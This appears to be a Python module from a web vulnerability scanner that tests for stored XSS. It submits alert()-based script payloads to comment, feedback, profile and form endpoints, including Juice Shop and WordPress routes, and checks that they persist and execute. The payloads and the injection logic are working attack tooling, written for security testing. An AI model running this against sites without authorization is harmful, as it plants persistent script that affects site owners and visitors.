"""
XSS Scanner - Stored XSS Strategy.

Tests for Stored XSS with REAL persistence verification.
Submits payloads, then retrieves in a fresh session to confirm.

Extracted from xss_scanner.py as part of Phase 7 refactoring (2026-02-26).
"""

from __future__ import annotations

import asyncio
import hashlib
import html
import random
import string
from typing import TYPE_CHECKING, Any
from urllib.parse import urlparse

import httpx

from utils.logger import get_logger
from utils.scan_client import get_scan_client

from scanning.modules.xss.xss_base import XSSContext, XSSEvidence, WAFType
from scanning.modules.xss.strategies.base import (
    BaseXSSStrategy,
    XSSStrategyContext,
    XSSStrategyResult,
)

if TYPE_CHECKING:
    pass

logger = get_logger(__name__)


# Stored XSS payloads with unique ID placeholder
STORED_XSS_PAYLOADS: list[str] = [
    '<script>alert("STORED_XSS_{id}")</script>',
    '<img src=x onerror=alert("STORED_XSS_{id}")>',
    '<svg onload=alert("STORED_XSS_{id}")>',
    '"><script>alert("STORED_XSS_{id}")</script>',
    "'-alert('STORED_XSS_{id}')-'",
]

# Common endpoints for stored XSS testing
STORED_XSS_ENDPOINTS: dict[str, list[tuple[str, str, dict, str]]] = {
    "generic": [
        # (submit_path, method, data_template, retrieve_path)
        ("/comments", "POST", {"comment": "{payload}", "name": "test"}, "/comments"),
        ("/feedback", "POST", {"message": "{payload}"}, "/feedback"),
        ("/profile", "POST", {"bio": "{payload}", "name": "test"}, "/profile"),
        ("/guestbook", "POST", {"message": "{payload}", "name": "visitor"}, "/guestbook"),
        ("/api/comments", "POST", {"text": "{payload}"}, "/api/comments"),
        ("/api/feedback", "POST", {"comment": "{payload}"}, "/api/feedback"),
    ],
    "juice-shop": [
        ("/api/Feedbacks", "POST", {"comment": "{payload}", "rating": "5"}, "/administration"),
        ("/rest/products/{id}/reviews", "PUT", {"message": "{payload}"}, "/rest/products/{id}/reviews"),
    ],
    "wordpress": [
        ("/wp-comments-post.php", "POST", {"comment": "{payload}"}, "/"),
    ],
}


class StoredXSSStrategy(BaseXSSStrategy):
    """Stored XSS testing strategy with persistence verification.

    This separates professional scanners from basic ones:
    1. Submit payload to storage endpoint (POST)
    2. Wait for persistence
    3. Retrieve data in NEW session (GET)
    4. Verify payload executes in fresh context
    5. Confirm it's truly STORED, not reflected
    """

    # Max time per endpoint
    ENDPOINT_TIMEOUT = 10.0
    # Max endpoints to test
    MAX_ENDPOINTS = 15

    @property
    def name(self) -> str:
        return "stored_xss"

    async def test(self, ctx: XSSStrategyContext) -> XSSStrategyResult:
        """Test for stored XSS with persistence verification.

        Strategy:
        1. Detect application type for targeted testing
        2. Get relevant endpoint configurations
        3. Submit payload, wait, retrieve in fresh session
        4. Verify payload persists and executes
        """
        evidence_list: list[XSSEvidence] = []
        attempts = 0
        errors: list[str] = []

        # Detect application type
        app_type = self._detect_application_type(ctx)
        logger.info(f"[XSS-Stored] Detected app type: {app_type or 'generic'}")

        # Get endpoints to test
        endpoints = self._get_test_endpoints(ctx, app_type)
        if not endpoints:
            return XSSStrategyResult.not_found(0, ["No storage endpoints found"])

        # Generate unique scan ID
        scan_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

        async with get_scan_client(timeout=ctx.timeout, follow_redirects=True) as client:
            for endpoint_config in endpoints[:self.MAX_ENDPOINTS]:
                submit_path, method, data_template, retrieve_path = endpoint_config
                attempts += 1

                try:
                    result = await asyncio.wait_for(
                        self._test_single_endpoint(
                            client, ctx, submit_path, method,
                            data_template, retrieve_path, scan_id
                        ),
                        timeout=self.ENDPOINT_TIMEOUT
                    )
                    if result:
                        evidence_list.append(result)
                        logger.info(f"[XSS-Stored] CONFIRMED at {submit_path}")

                except asyncio.TimeoutError:
                    errors.append(f"Timeout: {submit_path}")
                except Exception as e:
                    errors.append(f"Error {submit_path}: {e}")

        if evidence_list:
            return XSSStrategyResult.vulnerable(evidence_list, attempts)
        return XSSStrategyResult.not_found(attempts, errors)

    async def _test_single_endpoint(
        self,
        client: httpx.AsyncClient,
        ctx: XSSStrategyContext,
        submit_path: str,
        method: str,
        data_template: dict,
        retrieve_path: str,
        scan_id: str,
    ) -> XSSEvidence | None:
        """Test a single endpoint pair for stored XSS."""
        # Resolve URLs
        submit_url = self._resolve_url(ctx.host or ctx.base_url, submit_path)
        retrieve_url = self._resolve_url(ctx.host or ctx.base_url, retrieve_path)

        for payload_template in STORED_XSS_PAYLOADS[:5]:
            # Generate unique payload ID
            payload_id = f"{scan_id}_{hashlib.md5(submit_url.encode()).hexdigest()[:6]}"
            payload = payload_template.replace("{id}", payload_id)

            # Build submission data
            submit_data = {}
            for key, value in data_template.items():
                if "{payload}" in str(value):
                    submit_data[key] = str(value).replace("{payload}", payload)
                else:
                    submit_data[key] = value

            try:
                # Step 1: Submit payload
                await ctx.acquire_rate_limit()

                if method.upper() in ["POST", "PUT", "PATCH"]:
                    try:
                        response = await client.request(
                            method.upper(), submit_url,
                            json=submit_data,
                            headers={"Content-Type": "application/json", **ctx.auth_headers}
                        )
                    except (httpx.RequestError, TypeError):
                        response = await client.request(
                            method.upper(), submit_url,
                            data=submit_data,
                            headers=ctx.auth_headers
                        )
                else:
                    response = await client.request(
                        method.upper(), submit_url,
                        params=submit_data,
                        headers=ctx.auth_headers
                    )

                if response.status_code >= 400:
                    continue

                # Step 2: Wait for persistence
                await asyncio.sleep(0.5)

                # Step 3: Retrieve in FRESH session
                await ctx.acquire_rate_limit()

                async with httpx.AsyncClient(
                    timeout=10.0,
                    verify=False,
                    follow_redirects=True,
                ) as fresh_client:
                    retrieve_resp = await fresh_client.get(
                        retrieve_url,
                        headers={
                            "User-Agent": "Mozilla/5.0 (StoredXSS-Victim)",
                            "Cache-Control": "no-cache",
                        }
                    )

                    # Step 3b: Verify persistence with second request
                    await asyncio.sleep(0.3)
                    verify_resp = await fresh_client.get(
                        retrieve_url,
                        headers={
                            "User-Agent": "Mozilla/5.0 (StoredXSS-Verify)",
                            "Cache-Control": "no-cache",
                        }
                    )

                # Step 4: Verify payload persists and executes
                if payload_id in retrieve_resp.text and payload_id in verify_resp.text:
                    is_executable = self._verify_executable(retrieve_resp.text, payload_id)
                    is_persistent = self._verify_executable(verify_resp.text, payload_id)

                    if is_executable and is_persistent:
                        return XSSEvidence(
                            payload=payload,
                            context=XSSContext.HTML_TEXT,
                            reflected_in="stored_persistence",
                            encoding_used="none",
                            waf_bypassed=ctx.detected_waf is not None and ctx.detected_waf != WAFType.NONE,
                            response_snippet=self._extract_snippet(payload_id, retrieve_resp.text),
                            confirmation_count=2,  # Retrieved twice
                            metadata={
                                "stored_xss": True,
                                "persistence_verified": True,
                                "payload_id": payload_id,
                                "submit_endpoint": submit_url,
                                "retrieve_endpoint": retrieve_url,
                                "severity": "CRITICAL",
                            }
                        )

            except Exception as e:
                logger.debug(f"[XSS-Stored] Test failed: {e}")
                continue

        return None

    def _resolve_url(self, host: str, path: str) -> str:
        """Resolve full URL from host and path."""
        if path.startswith("http"):
            return path

        if host.startswith("http"):
            base_url = host
        else:
            port = "443"
            if ":" in host:
                port = host.split(":")[-1]
            if port in ["80", "8080", "8000", "3000", "5000"]:
                base_url = f"http://{host}"
            else:
                base_url = f"https://{host}"

        if path.startswith("/"):
            return f"{base_url}{path}"
        return f"{base_url}/{path}"

    def _verify_executable(self, content: str, payload_id: str) -> bool:
        """Verify payload is in executable context."""
        executable_indicators = [
            f'<script>alert("STORED_XSS_{payload_id}")</script>',
            f'onerror=alert("STORED_XSS_{payload_id}")',
            f'onload=alert("STORED_XSS_{payload_id}")',
            f"alert('STORED_XSS_{payload_id}')",
        ]

        for indicator in executable_indicators:
            if indicator in content:
                pos = content.find(indicator)
                before = content[:pos]

                # Not in HTML comment
                if before.rfind("<!--") > before.rfind("-->"):
                    continue

                # Not HTML-escaped
                escaped = html.escape(indicator)
                if escaped in content and indicator not in content.replace(escaped, ""):
                    continue

                return True

        # Check for tag presence near payload
        if f"STORED_XSS_{payload_id}" in content:
            pos = content.find(f"STORED_XSS_{payload_id}")
            context = content[max(0, pos - 100):pos + 100]
            for tag in ["<script", "<img", "<svg", "onerror=", "onload="]:
                if tag in context.lower():
                    return True

        return False

    def _detect_application_type(self, ctx: XSSStrategyContext) -> str | None:
        """Detect application type for targeted testing."""
        host = ctx.host or ctx.base_url
        tech = ctx.asset_data.get("technologies", {}) if ctx.asset_data else {}

        if "juice" in host.lower() or "juice-shop" in str(tech).lower():
            return "juice-shop"
        if "wordpress" in str(tech).lower() or "wp-" in str(ctx.asset_data).lower():
            return "wordpress"

        # Check endpoints
        endpoints = ctx.asset_data.get("endpoints", []) if ctx.asset_data else []
        for ep in endpoints:
            if "/wp-" in ep:
                return "wordpress"
            if "/admin" in ep or "/cms" in ep:
                return "cms"

        return None

    def _get_test_endpoints(
        self,
        ctx: XSSStrategyContext,
        app_type: str | None,
    ) -> list[tuple[str, str, dict, str]]:
        """Get endpoints to test for stored XSS."""
        endpoints = []

        # Add generic endpoints
        endpoints.extend(STORED_XSS_ENDPOINTS.get("generic", []))

        # Add app-specific endpoints
        if app_type:
            endpoints.extend(STORED_XSS_ENDPOINTS.get(app_type, []))

        # Add endpoints from discovered forms
        if ctx.asset_data:
            for form in ctx.asset_data.get("forms", []):
                if form.get("method", "").upper() == "POST":
                    action = form.get("action", "")
                    inputs = form.get("inputs", [])

                    data_template = {}
                    for inp in inputs:
                        name = inp.get("name", "")
                        if name and inp.get("type") not in ["hidden", "submit", "button"]:
                            data_template[name] = "{payload}"
                        elif name:
                            data_template[name] = inp.get("value", "")

                    if data_template and any("{payload}" in str(v) for v in data_template.values()):
                        endpoints.append((action, "POST", data_template, action))

        return endpoints


__all__ = ["StoredXSSStrategy"]
